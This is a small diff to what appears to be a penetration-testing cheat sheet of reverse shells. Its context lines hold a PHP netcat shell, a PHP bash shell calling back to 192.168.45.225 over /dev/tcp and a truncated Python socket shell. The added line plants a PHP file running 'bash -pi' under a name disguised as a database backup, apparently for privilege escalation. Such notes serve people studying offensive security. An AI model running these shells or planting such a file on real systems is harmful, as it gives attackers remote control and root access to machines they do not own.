@@ -309,6 +309,9 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 <?php system('nc <IP> <PORT> -e /bin/bash')?>
 
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.225/445 0>&1'");?>
+
+echo "<?php system('bash -pi'); ?>" > /var/backups/database-backup.php
+
 ```
 ### Python Shells
 ```bash
